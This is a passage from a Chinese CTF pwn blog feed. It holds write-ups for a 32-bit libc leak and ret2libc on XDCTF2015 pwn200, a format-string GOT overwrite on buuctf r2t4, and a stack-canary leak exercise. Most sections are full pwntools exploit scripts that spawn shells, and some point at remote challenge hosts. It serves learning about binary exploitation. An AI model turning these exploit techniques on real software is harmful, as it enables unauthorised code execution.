class="number">4</span></span><br></pre></td></tr></table></figure><p>好我们现在该怎么办当然是利用已用的函数去调用他们PLT表去把他们的got表的的输出出来那好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>+p32(write_plt) + p32(main_addr)+p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br></pre></td></tr></table></figure><p>上面是他的传参方式:padding+ fake_ebp+p32(system)+p32(返回地址)+p32(system 的参数)</p><p>我调用的是write的函数所以有:int write(int handle,void *buf,int len); 第一个参数是文件句柄,第二个是他的内容，第三个是要写入的长度(所以是0x4)</p><p>方法一:</p><p>这个情况是知道对方的libc,不过一般来说要不就是 16,18,20Ubuntu的libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;159.138.137.79&quot;,55989)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)<span class="comment">#获取文件句柄</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<span class="comment">#本地libc的位置</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#read在plt表的地址</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#read在got表的地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#write在plt表的地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#write在got表的地址</span></span><br><span class="line">main_addr = <span class="number">0x080483D0</span><span class="comment">#main函数的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)<span class="comment">#发送payload</span></span><br><span class="line"></span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>)) <span class="comment">#接受泄漏出的write_got表真实的地址</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]  <span class="comment">#libc函数的实际地址-泄漏出来的地址=基地址</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#libc的system的地址+基地址=system的实际地址</span></span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()<span class="comment">#基地址+libc查找/bin/sh字符串的地址=实际地址</span></span><br><span class="line">log.success(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system) + p32(main_addr) + p32(binsh)<span class="comment">#直接正常rop</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)<span class="comment">#发送payload</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>方法二:</p><p>我是听说DynELF这个函数来做看了好多wp都是这样这个我只能弄出代码来解释了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=remote(&#x27;111.200.241.244&#x27;,54040)</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">padding=(<span class="number">0x6c</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span><span class="comment">#溢出的值</span></span><br><span class="line">main_addr=<span class="number">0x080484BE</span><span class="comment">#main函数的地址</span></span><br><span class="line"><span class="comment">#ppp_addr=0x080485cd</span></span><br><span class="line">ppp_addr=<span class="number">0x0804856c</span><span class="comment">#三次pop指令的地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload=padding+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">    <span class="keyword">return</span> sh.recv(<span class="number">4</span>)<span class="comment">#接受泄漏函数的地址</span></span><br><span class="line">d=DynELF(leak,elf=elf)</span><br><span class="line">sys_addr=d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)<span class="comment">#要泄漏的地址</span></span><br><span class="line">payload=padding+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bss_addr)</span><br><span class="line"><span class="comment">#在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress</span></span><br><span class="line"><span class="comment">#read(0,bss_addr,8)把&#x27;/bin/sh&#x27;读到bss段上，因为bss段可执行</span></span><br><span class="line"><span class="comment">#用三次pop把指针指向了systemAddress，此时调用system()函数，再栈溢出把bss段上的内容(&#x27;/bin/sh&#x27;)当作参数传给system()调用</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>,payload)</span><br><span class="line">sh.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>解释:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用pwntools提供的工具DynELF来泄露system在libc中的地址，利用<span class="number">3</span>次pop(有现成的代码)和ret调用read函数把(<span class="string">&quot;/bin/sh&quot;</span>)读取到bss段上，再构造ROP链执行system(<span class="string">&quot;/bin/sh&quot;</span>)从而getshell。</span><br></pre></td></tr></table></figure><p>方法三:</p><p>就是利用一个工具去泄漏libc:LibcSearcher好像就是为了打远程而生的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p= process(&quot;./pwn200&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="number">49726</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_leak)</span><br><span class="line">libc_base = write_leak - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造shellcode 的方式是 padding+ fake_ebp+p32(system)+p32(返回地址)+p32(system 的参数)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;泄漏libc总结-1-32位&quot;&gt;&lt;a href=&quot;#泄漏libc总结-1-32位&quot; class=&quot;headerlink&quot; title=&quot;泄漏libc总结(1)32位&quot;&gt;&lt;/a&gt;泄漏libc总结(1)32位&lt;/h1&gt;&lt;p&gt;复习复习泄漏libc的几种方法，我将以pwn</summary>
      
    
    
    
    
    <category term="xctf-pwn" scheme="http://example.com/tags/xctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-r2t4</title>
    <link href="http://example.com/2021/11/23/buuctf-r2t4/"/>
    <id>http://example.com/2021/11/23/buuctf-r2t4/</id>
    <published>2021-11-23T12:51:53.000Z</published>
    <updated>2021-11-23T13:00:20.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="buuctf-r2t4"><a href="#buuctf-r2t4" class="headerlink" title="buuctf-r2t4"></a>buuctf-r2t4</h1><p>这题我不知道怎么说的很无语子</p><p>是他没开pie，其他全开</p><p>有格式化字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本来我的思路是格式化字符串拿到Canary然后正常溢出+Canary来获取get flag但是好像不是那个回事得整不会了直接看wp看的稀里糊涂的是格式化字符串修改got表然后整了一波看的懂好像又不懂的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">要想利用格式化字符串漏洞，首先要了解格式化字符</span><br><span class="line">其中格式化字符有：</span><br><span class="line"></span><br><span class="line">%c：输出字符，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%d：输出十进制整数，配上%n可用于向指定地址写数据。</span><br><span class="line"></span><br><span class="line">%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</span><br><span class="line"></span><br><span class="line">%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</span><br><span class="line"></span><br><span class="line">%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</span><br><span class="line"></span><br><span class="line">%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节）</span><br><span class="line">%nh:将写入的地址空间为2字节,</span><br><span class="line">%hhn表示写入的地址空间为1字节</span><br><span class="line">%$hhn表示写入的地址空间为1字节</span><br><span class="line">%$lln表示写入的地址空间为8字节，</span><br><span class="line">在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</span><br></pre></td></tr></table></figure><p>找字符串偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r</span><br><span class="line">输入aaaaa</span><br><span class="line">pwndbg&gt; search aaaa<span class="comment">#找字符串aaaa</span></span><br><span class="line">[stack]         <span class="number">0x7fffffffdda0</span> <span class="number">0xa616161616161</span> /* <span class="string">&#x27;aaaaaa\n&#x27;</span> */</span><br><span class="line">pwndbg&gt; fmtarg <span class="number">0x7fffffffdda0</span></span><br><span class="line">The index of <span class="built_in">format</span> argument : <span class="number">7</span> (<span class="string">&quot;\%6$p&quot;</span>)<span class="comment">#得到偏移</span></span><br></pre></td></tr></table></figure><p>现在就是怎么构造的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%64c%<span class="number">9</span>$hn%1510c%<span class="number">10</span>$hnaaa</span><br></pre></td></tr></table></figure><p>看他们的发现说哪个程序会输入大量的字符串同时拆开不是个小数目,我们就要用%numc这种格式输入多少个字符串</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">64:对应高地址(0x40)的10进制</span><br><span class="line"></span><br><span class="line">9:关于这个9我的建议是先写payload，写好具体长度是多少再写上</span><br><span class="line">由于格式化字符串<span class="comment">%64c%9$hn%1510c%10$hnaaa占用了24个字节，根据64位程序，24/8=3,所以偏移是6+3=9，配合上$hn使用构成%9$hn,将64（0x40）写入偏移为9的位置，对应的是__stack_chk_fail+2</span></span><br><span class="line"></span><br><span class="line">1510：1510+64=1574=0x626，对应backdoor函数地址的低两字节0x0626</span><br><span class="line"></span><br><span class="line">10 ：在偏移9的基础上加上p64(<span class="built_in">_</span><span class="built_in">_</span>stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail+2)地址的一字节，即偏移为10</span><br><span class="line"></span><br><span class="line">aaa：填充作用，随便写，使之为8的倍数让栈对齐</span><br><span class="line"></span><br><span class="line">p64(<span class="built_in">_</span><span class="built_in">_</span> stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail+2) + p64(<span class="built_in">_</span><span class="built_in">_</span>stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail) ：将backdoor函数地址分为高两个字节和低两字节进行写入</span><br><span class="line">数据传入是小端传序，从checksec可以看出       Arch:     amd64-64-little</span><br><span class="line">所以我们先传后面两个字节也就是更改<span class="built_in">_</span><span class="built_in">_</span> stack<span class="built_in">_</span>chk<span class="built_in">_</span>fail+2</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote(&#x27;node3.buuoj.cn&#x27;,29883)</span></span><br><span class="line">r = process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%64c%9$hn%1510c%10$hnaaa&quot;</span> + p64(__stack_chk_fail+<span class="number">2</span>) + p64(__stack_chk_fail)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>我只是明白这个模版是怎么用的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,word_size=<span class="string">&#x27;64&#x27;</span>)</span><br><span class="line">backdoor = <span class="number">0x0000000000400626</span></span><br><span class="line">p = process(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./r2t4&#x27;</span>)</span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;__stack_chk_fail:backdoor&#125;).ljust(<span class="number">0x38</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>模版的使用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__stack_chk_fail=要修改的地址</span><br><span class="line">backdoor=填充的字符串溢出触发Canary</span><br><span class="line">6=字符串的偏移</span><br></pre></td></tr></table></figure><p>总结:开始得了把好像又清楚好像又不清楚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;buuctf-r2t4&quot;&gt;&lt;a href=&quot;#buuctf-r2t4&quot; class=&quot;headerlink&quot; title=&quot;buuctf-r2t4&quot;&gt;&lt;/a&gt;buuctf-r2t4&lt;/h1&gt;&lt;p&gt;这题我不知道怎么说的很无语子&lt;/p&gt;
&lt;p&gt;是他没开pie，其他全开</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-canary的gdb调试小节</title>
    <link href="http://example.com/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/"/>
    <id>http://example.com/2021/11/13/pwn-canary%E7%9A%84gdb%E8%B0%83%E8%AF%95%E5%B0%8F%E8%8A%82(1)/</id>
    <published>2021-11-13T12:24:08.000Z</published>
    <updated>2021-11-13T13:46:18.672Z</updated>
    
    <content type="html"><![CDATA[<h2 id="canary简意"><a href="#canary简意" class="headerlink" title="canary简意"></a><strong>canary</strong>简意</h2><p>​        通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。</p><p>​        概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值,栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。</p><p>那我们看向题目:</p><p><img src="../../images/image-20211113203733085.png" alt="image-20211113203733085"></p><p>多的我不多说直接看vuln函数,点击(call vuln函数)</p><p><img src="../../images/image-20211113204134668.png" alt="image-20211113204134668"></p><p>漏洞点就那几个当时我想的思路是(程序能运行两次)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式化字符串泄漏出canary的地址+然后算出canary的偏移覆盖掉+覆盖掉ebp+/bin/sh</span><br></pre></td></tr></table></figure><p>好像是那个回事但是我找的偏移方式就是(aaaa-%p-%p-%p)但是找不到这个办法是不可靠的于是我查查其他的资料发现有其他的方式找到canary的偏移</p><p>在vuln的汇编代码中</p><p><img src="../../images/image-20211113204832991.png" alt="image-20211113204832991"></p><p>canary函数栈帧初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:080485FC                 mov     eax, large gs:14h</span><br><span class="line">.text:08048602                 mov     [ebp+var_C], eax</span><br></pre></td></tr></table></figure><p>栈上放置canary值并且在退出前验证</p><p><img src="../../images/image-20211113205853126.png" alt="image-20211113205853126"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048640                 mov     eax, [ebp+var_C]</span><br><span class="line">.text:08048643                 xor     eax, large gs:14h</span><br></pre></td></tr></table></figure><h2 id="好开始技巧方面的了"><a href="#好开始技巧方面的了" class="headerlink" title="好开始技巧方面的了"></a>好开始技巧方面的了</h2><p>我们直接pwngdb调试(s 进入到这个函数里面)</p><p><img src="../../images/image-20211113210209032.png" alt="image-20211113210209032"></p><p>然后到下面这张图里面</p><p><img src="../../images/image-20211113210311364.png" alt="image-20211113210311364"></p><p>输入查看栈帧初始化地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print $ebp-0xc</span><br><span class="line">$1 = (void *) 0xffffcfbc#好好保存这个地址</span><br></pre></td></tr></table></figure><p>然后我们n单步过去</p><p><img src="../../images/image-20211113210521457.png" alt="image-20211113210521457"></p><p>保存好buf的地址（Oxfffcf58）</p><p>下面计算出他的基地址不包含canary的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcfbc-0xffffcf58 =100</span><br></pre></td></tr></table></figure><p>算出的canary偏移</p><p>开始设置断点</p><p><img src="../../images/image-20211113211234271.png" alt="image-20211113211234271"></p><p>进入vuln单步到如下</p><p><img src="../../images/image-20211113211352324.png" alt="image-20211113211352324"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">print</span> $ebp-<span class="number">0xc</span></span><br><span class="line">$<span class="number">2</span> = (void *) <span class="number">0xffffcfbc</span><span class="comment">#保存好地址</span></span><br></pre></td></tr></table></figure><p>再单步到如下</p><p><img src="../../images/image-20211113211858447.png" alt="image-20211113211858447"></p><p>获取了esp的基地址（0xffffcf40）地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0xffffcfbc-0xffffcf40)/4=31#同理64位 /8</span><br></pre></td></tr></table></figure><p>得到偏移31的地址</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r= process(&#x27;./leak_canary&#x27;)</span><br><span class="line">r.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line">getshell=ELF(&#x27;leak_canary&#x27;).sym[&#x27;getshell&#x27;]</span><br><span class="line">r.sendline(&#x27;%31$p&#x27;)</span><br><span class="line">r.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">canary=int(r.recv(8), 16)</span><br><span class="line">print hex(canary)</span><br><span class="line"></span><br><span class="line">payload=&#x27;a&#x27;*100+p32(canary)+&#x27;b&#x27;*8+&#x27;c&#x27;*4+p32(getshell) </span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>我解释一下最后一个payload变量的意思</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+p32(canary)+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">4</span>+p32(getshell)</span><br><span class="line"> 基地址+泄漏的canary+填充垃圾数据+覆盖ebp+getshell</span><br></pre></td></tr></table></figure><p>他这个垃圾数据是</p><p>你buf有0x70的空间,你基地址+canary(是4个字节)+8个字节垃圾数据等于=0x70,不然你无法溢出</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;canary简意&quot;&gt;&lt;a href=&quot;#canary简意&quot; class=&quot;headerlink&quot; title=&quot;canary简意&quot;&gt;&lt;/a&gt;&lt;strong&gt;canary&lt;/strong&gt;简意&lt;/h2&gt;&lt;p&gt;​        通常栈溢出的利用方式是通过溢出存在于栈上</summary>
      
    
    
    
    
    <category term="pwn-canary" scheme="http://example.com/tags/pwn-canary/"/>
    
  </entry>
  
  <entry>
    <title>v4.6.0-gdb.attach问题</title>
    <link href="http://example.com/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2021/11/10/v4-6-0-gdb-attach%E9%97%AE%E9%A2%98/</id>
    <published>2021-11-10T08:40:03.000Z</published>
